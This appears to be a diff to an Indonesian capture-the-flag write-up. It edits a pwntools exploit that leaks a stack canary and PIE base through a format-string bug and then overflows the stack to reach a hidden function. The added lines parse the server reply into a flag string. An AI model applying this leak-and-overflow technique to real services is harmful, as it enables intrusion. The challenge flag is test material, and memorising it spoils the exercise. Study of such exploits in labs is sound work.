@@ -176,7 +176,7 @@ Seluruh kode yang dipakai ditulis lengkap di bawah ini — bukan potongan. Salin
 ```python
 #!/usr/bin/env python3
 """Timah Hitam - format-string leak (menu 5) + stack overflow (menu 6) -> fungsi tersembunyi."""
-import sys
+import re, sys
 from pwn import *
 
 context.arch = 'amd64'
@@ -211,7 +211,15 @@ log.warn(f'PIE base = {base:#014x}')
 assert canary & 0xff == 0, 'canary harus berakhir 0x00'
 assert base & 0xfff == 0, 'basis PIE harus rata halaman'
 buka(io, canary, base)
-print(io.recvall(timeout=5).decode(errors='replace').strip())
+keluaran = io.recvall(timeout=5).decode(errors='replace').strip()
+print(keluaran)
+
+# Server mencetak "BENAR! Kunci: <kunci>" -> rakit jadi flag utuh.
+cocok = re.search(r'BENAR! Kunci:\s*(\S+)', keluaran)
+if cocok:
+    print(f'[+] FLAG = TechtonicExpoCTF{{{cocok.group(1)}_66394FFC}}')
+else:
+    print('[-] kunci tidak muncul - eksploit gagal')
 ```
 
 ---
